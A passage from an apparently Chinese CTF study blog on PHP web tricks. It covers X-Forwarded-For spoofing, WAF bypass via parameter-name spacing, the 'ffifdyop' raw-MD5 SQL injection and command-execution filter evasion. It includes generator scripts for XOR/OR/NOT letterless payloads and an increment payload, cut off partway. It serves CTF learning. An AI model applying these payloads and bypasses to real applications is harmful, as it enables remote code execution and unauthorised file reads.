<h2 id="11-X-Forwarded-For伪造ip访问"><a href="#11-X-Forwarded-For伪造ip访问" class="headerlink" title="11.X-Forwarded-For伪造ip访问"></a>11.X-Forwarded-For伪造ip访问</h2><p>伪造本地ip 127.0.0.1,所以我们可以利用<code>X-Forwarded-For</code>​协议来伪造只需要在 header 添加 <code>X-Forwarded-For:127.0.0.1</code>​</p>
<img src="/2023/10/23/%E5%B0%8F%E5%B8%B8%E8%AF%86/image-20231022205327-vfu1j56.png" class="" title="image">​

<h2 id="12-参数类型只能为数字，怎么办？如何绕过"><a href="#12-参数类型只能为数字，怎么办？如何绕过" class="headerlink" title="12.参数类型只能为数字，怎么办？如何绕过"></a>12.参数类型只能为数字，怎么办？如何绕过</h2><p>答案：在变量名前面加空格。</p>
<p><strong>?</strong> num**&#x3D;<strong>2;var_dump</strong>(<strong>scandir</strong>(<strong>chr</strong>(<strong>47</strong>)<strong>)</strong>)**</p>
<p><strong>?</strong> num**&#x3D;<strong>var_dump</strong>(<strong>scandir</strong>(<strong>chr</strong>(<strong>47</strong>)<strong>)</strong>)**</p>
<p>为什么要在num前加一个空格？</p>
<p>答：假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</p>
<p>PHP的字符串解析特性是什么？</p>
<p>答： PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：1.删除空白符  2.将某些字符转换为下划线（包括空格）【当waf不让你过的时候，php却可以让你过】</p>
<h2 id="13-‘’-flag被过滤"><a href="#13-‘’-flag被过滤" class="headerlink" title="13.&#x2F; ‘’ flag被过滤"></a>13.&#x2F; ‘’ flag被过滤</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">? num=print_r(scandir(<span class="string">&#x27;/&#x27;</span>)); </span><br><span class="line"></span><br><span class="line">chr(47)=<span class="string">&#x27;/&#x27;</span></span><br><span class="line"></span><br><span class="line">? num=print_r(scandir(chr(47)));</span><br></pre></td></tr></table></figure>

<p>①：scandir — <strong>列出指定路径中的文件和目录。</strong></p>
<p><strong>②：var_dump()&#x2F;print_r —  函数用于输出变量的相关信息。</strong></p>
<p><strong>③：chr(47) — 是指ascii码为47的字符为&#x2F;而&#x2F;在linux中指的是根目录。</strong></p>
<p><strong>总结：输出并列出指定路径中的文件和根目录。</strong></p>
<p>‍</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">? num=print_r(file_get_contents(<span class="string">&#x27;/flagg&#x27;</span>));</span><br><span class="line"></span><br><span class="line">其中/flagg 用chr进行绕过</span><br><span class="line"></span><br><span class="line">? num=print_r(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)));</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>①：file_get_contents() — 函数是用于将文件的内容读入到一个字符串中的首选方法。如果操作系统支持，还会使用内存映射技术来增强性能。</p>
<p><strong>②：var_dump()&#x2F;print_r —  函数用于输出变量的相关信息。</strong></p>
<p>④：chr(47).chr(102).chr(49).chr(97).chr(103).chr(103) — 指的是<strong>ascii码</strong>转换为f1agg</p>
<p>总结：输出calc.php文件中f1agg目录的字符串内容。</p>
<h2 id="14-SQL注入-select-from-‘admin’-where-password-md5-pass-true"><a href="#14-SQL注入-select-from-‘admin’-where-password-md5-pass-true" class="headerlink" title="14.SQL注入 select * from ‘admin’ where password&#x3D;md5($pass,true)"></a>14.SQL注入 select * from ‘admin’ where password&#x3D;md5($pass,true)</h2><p>ffifdyop</p>
<img src="/2023/10/23/%E5%B0%8F%E5%B8%B8%E8%AF%86/image-20231023163420-1mknjha.png" class="" title="image">​

<p>129581926211651571912466741651878684928</p>
<img src="/2023/10/23/%E5%B0%8F%E5%B8%B8%E8%AF%86/image-20231023163506-ynq7xam.png" class="" title="image">​

<p> 下面就说明这道题的sql注入的原理，我们可以直接看到后台里面的php判断代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!-- <span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">	<span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM admin WHERE username = &#x27;admin&#x27; and password = &#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>,<span class="literal">true</span>).<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">	<span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>,<span class="variable">$sql</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;flag is :&#x27;</span>.<span class="variable">$flag</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;密码错误!&#x27;</span>;</span><br><span class="line">		&#125; --&gt;</span><br></pre></td></tr></table></figure>

<pre><code>   从代码很容易知道，用mysqli_num_rows()函数来判断是否sql语句查询结果有返回值，那么重点就是那条sql语句。那么唯一可以sql注入的地方就是md5($password,true)这个地方。

   那么首先介绍一下md5这个函数。

 语法  
              md5(string,raw)
</code></pre>
<img src="/2023/10/23/%E5%B0%8F%E5%B8%B8%E8%AF%86/image-20231023164401-dorwxkt.png" class="" title="image">​

<p>content: ffifdyop<br>hex: 276f722736c95d99e921722cf9ed621c<br>raw: ‘or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c<br>string: ‘or’6]!r,b<br>    这里需要注意的是，当raw项为true时，返回的这个原始二进制不是普通的二进制（0，1），而是  ‘or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c  这种。</p>
<pre><code>   上面的’ffifdyop‘字符串对应的16位原始二进制的字符串就是”    &#39;or&#39;6\xc9]\x99\xe9!r,\xf9\xedb\x1c    “  。  &#39;  \  &#39;后面的3个字符连同&#39;  \  &#39;算一个字符，比如’    \xc9    ‘，所以上述一共16个。当然，像’    \xc9    ‘这种字符会显示乱码。
</code></pre>
<img src="/2023/10/23/%E5%B0%8F%E5%B8%B8%E8%AF%86/image-20231023164538-z1kpjhr.png" class="" title="image">​

<p>‍</p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
  </entry>
  <entry>
    <title>命令执行绕过</title>
    <url>/2023/10/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<p>摘要</p>
<span id="more"></span>

<h1 id="命令执行绕过"><a href="#命令执行绕过" class="headerlink" title="命令执行绕过"></a>命令执行绕过</h1><h2 id="1-空格绕过"><a href="#1-空格绕过" class="headerlink" title="1.空格绕过"></a>1.空格绕过</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">%09</span><br><span class="line"></span><br><span class="line"><span class="variable">$&#123;IFS&#125;</span></span><br><span class="line"></span><br><span class="line">&lt;</span><br><span class="line"></span><br><span class="line">IFS9 </span><br><span class="line">&#123;IFS&#125; </span><br><span class="line"><span class="variable">$IFS</span> </span><br><span class="line">$IFS<span class="variable">$1</span> //<span class="variable">$1</span>改成$加其他数字貌似都行 </span><br><span class="line">IFS </span><br><span class="line">&lt; </span><br><span class="line">&lt;&gt; </span><br><span class="line">&#123;<span class="built_in">cat</span>,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来 </span><br><span class="line">%20   (space) </span><br><span class="line">%09   (tab) </span><br><span class="line">X\=<span class="string">&#x27;cat\\x09./flag.php&#x27;</span>;<span class="variable">$X</span>       （\\x09表示tab，也可以用\\x20）</span><br></pre></td></tr></table></figure>



<p>‍</p>
<h2 id="2-system函数绕过"><a href="#2-system函数绕过" class="headerlink" title="2.system函数绕过"></a>2.system函数绕过</h2><p>passthru</p>
<p>‍</p>
<h2 id="3-cat绕过"><a href="#3-cat绕过" class="headerlink" title="3.cat绕过"></a>3.cat绕过</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sort</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">od</span></span><br><span class="line"></span><br><span class="line">less</span><br><span class="line"></span><br><span class="line">more</span><br><span class="line"></span><br><span class="line">使用<span class="built_in">tac</span>反向输出命令： </span><br><span class="line">linux命令中可以加\，所以甚至可以ca\t /fl\ag</span><br></pre></td></tr></table></figure>



<p>‍</p>
<h2 id="4-无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）"><a href="#4-无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）" class="headerlink" title="4.无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）"></a>4.无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/i&#x27;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="1）异或"><a href="#1）异或" class="headerlink" title="1）异或"></a>1）<strong>异或</strong></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$preg</span> = <span class="string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">		<span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">		<span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">			<span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># author yu22x</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="built_in">print</span>(param)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>php运行后生成一个txt文档，包含所有可见字符的异或构造结果。<br>接着运行python脚本即可。<br>运行结果</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">php运行后生成一个txt文档，包含所有可见字符的异或构造结果。</span><br><span class="line">接着运行python脚本即可。</span><br><span class="line">运行结果</span><br><span class="line"></span><br><span class="line">[+] your function：system</span><br><span class="line">[+] your command：ls</span><br><span class="line">(<span class="string">&quot;%08%02%08%08%05%0d&quot;</span>^<span class="string">&quot;%7b%7b%7b%7c%60%60&quot;</span>)(<span class="string">&quot;%0c%08&quot;</span>^<span class="string">&quot;%60%7b&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="2）或"><a href="#2）或" class="headerlink" title="2）或"></a>2）或</h3><p>system(“ls”);     使用XOR绕过，得到目录信息</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/?a=<span class="variable">$_</span>=(<span class="string">&#x27;(&quot;((%-&#x27;</span> ^ <span class="string">&#x27;[[[\@@&#x27;</span>);<span class="variable">$__</span>=(<span class="string">&#x27;[,([&#x27;</span>^<span class="string">&#x27;|@[|&#x27;</span>);<span class="variable">$_</span>(<span class="variable">$__</span>);</span><br></pre></td></tr></table></figure>

<p>原理是一样的，只需要在上面的脚本上稍加改动即可</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* author yu22x */</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;or_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$preg</span> = <span class="string">&#x27;/[0-9a-z]/i&#x27;</span>;<span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">		<span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">		<span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">			<span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># author yu22x</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;or_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="built_in">print</span>(param)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="3）取反"><a href="#3）取反" class="headerlink" title="3）取反"></a>3）取反</h3><p>因为取反的话，基本上用的都是一个不可见字符，所有不会触发到<a href="https://so.csdn.net/so/search?q=%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F&spm=1001.2101.3001.7020">正则表达式</a>，我们一个php脚本就可以</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//在命令行中运行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$system</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$system</span>).<span class="string">&#x27;)(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$command</span>).<span class="string">&#x27;);&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="4）自增"><a href="#4）自增" class="headerlink" title="4）自增"></a>4）自增</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//测试发现7.0.12以上版本不可使用</span></span><br><span class="line"><span class="comment">//使用时需要url编码下</span></span><br><span class="line"><span class="variable">$_</span>=[];<span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>;<span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>];<span class="variable">$___</span>=<span class="variable">$_</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span 